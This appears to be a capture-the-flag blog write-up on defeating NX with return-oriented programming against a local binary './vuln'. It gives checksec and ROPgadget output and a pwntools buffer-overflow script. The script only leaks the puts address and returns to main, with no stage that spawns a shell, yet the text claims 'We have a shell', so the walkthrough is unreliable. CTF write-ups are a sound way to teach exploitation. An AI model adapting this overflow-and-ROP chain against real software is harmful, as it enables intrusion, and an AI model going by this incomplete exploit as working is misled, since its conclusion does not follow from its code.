---
title: Pwn the Box - Advanced ROP
date: 2023-11-15
description: Exploiting a binary with NX enabled using Return Oriented Programming.
---

# Analysis

We start by checking the security mitigations on the binary.

```bash
checksec ./vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

As we can see, **NX is enabled**, so we can't execute shellcode on the stack. We need to use **ROP**.

## Finding Gadgets

We use `ROPgadget` to find useful gadgets.

```bash
ROPgadget --binary ./vuln --only "pop|ret"
```

We found a `pop rdi; ret` gadget at `0x4011bb`.

## Exploit

Here is the final python script using `pwntools`:

```python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')

rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

p.sendline(b'A'*40 + rop.chain())
p.interactive()
```

Boom! We have a shell.
